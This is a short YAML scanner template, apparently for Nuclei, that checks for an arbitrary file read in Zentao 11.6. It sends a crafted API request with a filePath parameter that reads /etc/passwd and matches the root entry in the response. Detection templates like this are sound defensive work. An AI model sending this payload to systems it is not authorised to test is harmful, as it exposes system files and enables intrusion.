id: zentao-filepath-fileread
info:
  name: Zentao 11.6 API File Path Arbitrary File Read
  author: ProjectDiscoveryAI
  severity: high
  tags: file-read, zentao
http:
  - raw:
      - |
        GET /api-getModel-api-getMethod-filePath=/etc/passwd/1 HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        regex:
          - "root:.*:0:0:"
